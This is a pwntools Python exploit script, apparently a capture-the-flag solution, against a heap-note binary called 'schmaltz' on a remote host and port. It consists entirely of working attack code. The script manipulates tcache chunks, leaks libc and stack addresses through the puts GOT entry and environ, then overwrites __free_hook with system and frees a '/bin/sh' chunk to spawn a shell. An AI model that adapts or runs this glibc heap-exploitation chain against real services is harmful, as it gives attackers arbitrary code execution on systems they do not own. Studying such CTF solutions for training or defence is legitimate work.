#!/usr/bin/env python
from pwn import *

def add(size, content='A'):
    s.sendlineafter('> ', '1')
    s.sendlineafter('> ', str(size))
    s.sendafter('> ', content)

def view(index):
    s.sendlineafter('> ', '3')
    s.sendlineafter('> ', str(index))
    s.recvuntil(': ')
    size = int(s.recvline(False))
    s.recvuntil(': ')
    content = s.recvline(False)
    return size, content

def delete(index):
    s.sendlineafter('> ', '4')
    s.sendlineafter('> ', str(index))

if len(sys.argv) == 1:
    s = process('./schmaltz', env = {'LD_PRELOAD': './libc.so.6'})
else:
    s = remote('52.23.219.15', 1337)

elf = ELF('./schmaltz')
libc = ELF('./libc.so.6')

add(0x10)
add(0x110)
delete(0)
delete(1)
add(0x18)
delete(1)

add(0xf0, p64(elf.symbols['note_table'] + 0x10))
add(0x110)
add(0x110, p64(elf.got['puts']) + p32(1) * 2)
libc_base = u64(view(1)[1].ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

delete(0)
delete(2)
add(0xe0, p64(libc_base + libc.symbols['environ']))
environ = u64(view(1)[1].ljust(8, '\0'))
log.info('environ: %#x' % environ)

delete(2)

add(0x10)
add(0x120)
delete(1)
delete(2)
add(0x18)
delete(2)

add(0xf0, p64(environ))
add(0x120)
add(0x120, p64(0))

delete(1)

add(0x10)
add(0x130)
delete(3)
delete(4)
add(0x18)
delete(4)

add(0xf0, p64(libc_base + libc.symbols['__free_hook']))
add(0x130, '/bin/sh\0')
add(0x130, p64(libc_base + libc.symbols['system']))
delete(4)

s.interactive()
